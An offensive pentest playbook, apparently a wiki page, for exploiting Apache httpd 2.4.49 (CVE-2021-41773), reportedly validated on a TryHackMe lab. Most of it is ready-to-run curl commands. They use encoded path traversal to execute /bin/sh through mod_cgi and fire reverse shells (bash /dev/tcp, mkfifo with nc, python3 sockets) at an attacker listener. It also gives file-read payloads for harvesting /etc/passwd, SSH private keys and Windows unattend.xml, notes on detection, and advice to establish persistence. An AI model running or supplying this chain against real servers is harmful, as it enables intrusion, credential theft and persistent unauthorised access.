
> **STATUS: AUDITED** — first-principles + primary-source derivation (EDB 50383 verbatim PoC; Rapid7 CVE-2021-41773 root-cause; SANS ISC 27908; Security Boulevard / Blueliv analysis for the file-read↔RCE authorization asymmetry) 2026-10-02; sandbox-verified mechanics (curl `%2e`-traversal wire-send; mod_cgi POST-body → CGI-response construction incl. the mandatory header block; oracles; all reverse-shell POST bodies `sh`-clean). **Full Linux RCE → reverse-shell foothold chain live-validated on THM:Modern Web Stacks:Task 5 LAMP 2026-10-02** (`/cgi-bin/ → /bin/sh`, `uid=1(daemon)`, interactive foothold obtained; file read 403 on the same box via `/icons/` — the expected authorization asymmetry). Still unvalidated: the file-read-success harvest path (box 403'd file read) and all Windows routes (Windows RCE has no derived command — a manual-adaptation candidate). Not CANONICAL — completeness not maxed per these gaps.

⚠️ **IOC — loud, expect real-time detection, and likely blocking, on a defended target.** Generic encoded-traversal rules fire on `%2e%2e` / `.%2e` independent of the CVE — an inline WAF/IPS will likely **block** the request (403/406), not just log it. Host EDR flags the Apache worker spawning `/bin/sh` → shell → outbound `/dev/tcp` (textbook web-RCE chain); the reverse-shell egress is NDR-visible. Forensically, `access_log` retains the traversal string regardless. Undefended lab/exam box (no WAF/IPS/EDR) → none of this fires. Log cleanup out of scope.

⚠️ **Foothold privilege = the Apache worker UID** (`www-data` / `apache` / `daemon` / `httpd`), NOT root. Low-priv foothold → PrivEsc.

⚠️ **Hard preconditions — RCE and file read are governed independently; a file-read 403 does NOT mean the box is safe from RCE.**

- **Apache httpd EXACTLY 2.4.49** — blind-checkable (Step 1 Preflight, `Server` header). 2.4.50 → `[[Apache httpd 2.4.50]]` (CVE-2021-42013, double-encoding); ≤ 2.4.48 and ≥ 2.4.51 not vulnerable by this path.
- **RCE (primary): mod_cgi / mod_cgid enabled AND a `/cgi-bin/` ScriptAlias.** The ScriptAlias directory carries `Require all granted` + `Options ExecCGI` (it must, for CGIs to run), so mod_cgi executes the traversed `/bin/sh` **independently of the root `Require all denied`**. NOT blind-checkable — Step 2 is the oracle.
- **File read (fallback / Windows): the traversed-to file must not be behind `Require all denied`.** The stock config ships `<Directory />  Require all denied`, so file read of paths like `/etc/passwd` commonly returns 403 **even on a fully RCE-vulnerable box**. A file-read 403 is expected and is NOT a disqualifier — it says nothing about the RCE path. NOT blind-checkable — Step 4 is the oracle.

---

## Step 1 — Preflight

##### Confirm Apache 2.4.49:

`curl -s -I --path-as-is "$scheme://$host:$port/" | grep -i '^Server:'`

- `Server: Apache/2.4.49 ...` → proceed to Step 2.
- `Server: Apache/2.4.50` → [[Apache httpd 2.4.50]] (CVE-2021-42013). 
- Any other version, or no `Server` header → INAPPLICABLE

A reverse proxy / CDN in front can mask the `Server` header → **if the version is otherwise known to be 2.4.49, proceed anyway**; Steps 2 and 4 are the real oracle.

---

## Step 2 — RCE probe (Linux — primary foothold test)

The direct foothold oracle. POST the command to `/bin/sh` through the CGI handler. mod_cgi feeds the POST body to `/bin/sh` on stdin; the leading `echo Content-Type: text/plain; echo;` emits the mandatory CGI header block (omit it → `500` malformed-header).

`curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "$scheme://$host:$port/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"`

- Output contains `uid=` → **RCE confirmed**. Record the worker UID (`www-data` / `apache` / `daemon`) → Step 3.
- `500 Internal Server Error` → CGI ran but header block malformed (re-check the body is pasted exactly) OR `/bin/sh` not CGI-executable.
- `403 Forbidden` → `/cgi-bin/` exists but execution denied (`ExecCGI` off / `Require` denied on the CGI dir) → RCE blocked → Step 4 (file-read fallback).
- `404 Not Found` → `/cgi-bin/` absent or not a `ScriptAlias` → RCE unavailable → Step 4 (file-read fallback).

⚠️ Do NOT gate this step on a file read. File-read and RCE run under different authorization (see preconditions) — a file-read 403 is common on an RCE-vulnerable box. Run this probe regardless.

---

## Step 3 — Escalate to interactive foothold (Linux)

RCE is per-request command execution; fire a reverse shell through the same vector for an interactive foothold.

##### Start a listener (separate terminal):

`nc -lvnp <lport>`

Default `<lport>` = `443` (widest egress).

##### Fire the reverse shell through the RCE vector:

`curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; setsid bash -c "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1" 2>/dev/null' "$scheme://$host:$port/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"`

`setsid` detaches the shell into its own session so Apache reaping the CGI process (CGI `Timeout`, default 60s) does not kill it; curl returns immediately.

##### Verify:

Listener shows `connect to [<lhost>] ...` then a prompt. In the shell:

`id`

- `uid=<n>(<worker_user>)` → interactive foothold confirmed → [[Reverse Shell Stabilization]] → [[Linux Privilege Escalation Checksheet]].
- No callback within 30s → Step 5.

---

## Step 4 — File read (fallback when RCE unavailable; primary on Windows)

Reached when Step 2 returned `403`/`404` (no usable CGI), or when the target is Windows. Read-only. Prefix `/icons/` is a stock Apache `Alias`; `/cgi-bin/` is the alternate.

##### Linux target:

`curl -s --path-as-is "<scheme>://<host>:<port>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"`

- Output contains `root:` … `:0:0:` lines → file read works. Harvest users, SSH keys (`/home/<user>/.ssh/id_*`, `/root/.ssh/id_*`), app configs/creds via repeated reads → `users_<host>.txt` / `creds_<host>.txt`.
- `403 Forbidden` → `/icons/` path behind `Require all denied` → retry once with the `/cgi-bin/` prefix (same tail): `curl -s --path-as-is "<scheme>://<host>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"`. Still `403` → arbitrary file read blocked by `Require all denied` (this does not contradict a working Step 2 RCE — different authorization).
- `404 Not Found` → `/icons/` not aliased → retry the `/cgi-bin/` prefix (above).

##### Windows target:

`curl -s --path-as-is "<scheme>://<host>:<port>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini"`

- Output contains INI section lines (`[extensions]` / `[fonts]` / `; for 16-bit app support`) → file read works. Harvest secrets (`/windows/win.ini`, webroot source under `/inetpub`, `/windows/panther/unattend.xml`, app configs) → creds → [[Credential Attacks]] / reuse.
- `403` / `404` → retry the `/cgi-bin/` prefix, same routing as Linux above.

##### Route out:

- File read yielded creds/keys → [[Loose Creds]] / [[SSH Keys]] / [[Credential Attacks]].
- Step 2 RCE and Step 4 file read both blocked → INAPPLICABLE; return to [[MASTER WORKFLOW/Step 6. Vulnerability Analysis]].
- Windows, file read works, RCE wanted → Windows RCE via this CVE has no reliable one-liner and is UNVERIFIED here; treat as a manual-adaptation candidate, not a routed step.

---

## Step 5 — Troubleshoot

Walk in order, stop at first fix.

### No callback, Step 2 `id` confirmed working

Egress blocked on `<lport>`. Kill listener, restart on next port, re-fire Step 3:

1. `<lport>` = `443`
2. `<lport>` = `80`
3. `<lport>` = `53`

### No callback on any egress port — `setsid` suspected absent

Shell killed on CGI reap. Re-fire Step 3 with `nohup`:

`curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; nohup bash -c "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1" >/dev/null 2>&1 &' "<scheme>://<host>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"`

### Callback drops immediately — `bash` absent on target

mkfifo + nc (POSIX `sh`):

`curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; setsid sh -c "rm -f /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/.f" 2>/dev/null' "<scheme>://<host>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"`

or python3:

`curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; setsid python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"<lhost>\",<lport>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")" 2>/dev/null' "<scheme>://<host>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"`

### Step 2 `500`

CGI executed but the response header block was malformed — confirm the POST body begins exactly `echo Content-Type: text/plain; echo;` before the command.

### All probes `404`

Traversal prefix wrong or app not at the web root. Confirm an alias exists (`/icons/`, `/cgi-bin/`) and that `<port>` serves the Apache instance directly (not a fronting proxy). A non-standard `ScriptAlias` (e.g. `/cgi/`) → substitute it for `/cgi-bin/` in Steps 2–4.

---

## Cleanup / IOC

- File read: read-only, no target artifact.
- RCE / reverse shell: no disk artifact from the payload. The reverse shell is a detached (`setsid`) process owned by the worker user — `kill` it when done (or it dies on Apache restart); establish persistence from the shell first if continued access is needed.
- Apache `access_log` records every request carrying the `.%2e` / `%2e%2e` traversal string; post-disclosure WAF/IDS signatures flag it. Log cleanup out of scope.

---

## Decision

- Interactive foothold as the worker UID → [[Reverse Shell Stabilization]] → [[Linux Privilege Escalation Checksheet]].
- File-read-only (no mod_cgi) → harvested users/keys/creds → [[Loose Creds]] / [[SSH Keys]] / [[Credential Attacks]].
- Windows target → file read reliable; RCE is an unverified manual-adaptation candidate, not a routed step.
- Target is Apache **2.4.50** → sibling [[Apache httpd 2.4.50]] (CVE-2021-42013)

---

## Validation

THM:Modern Web Stacks:Task 5 LAMP
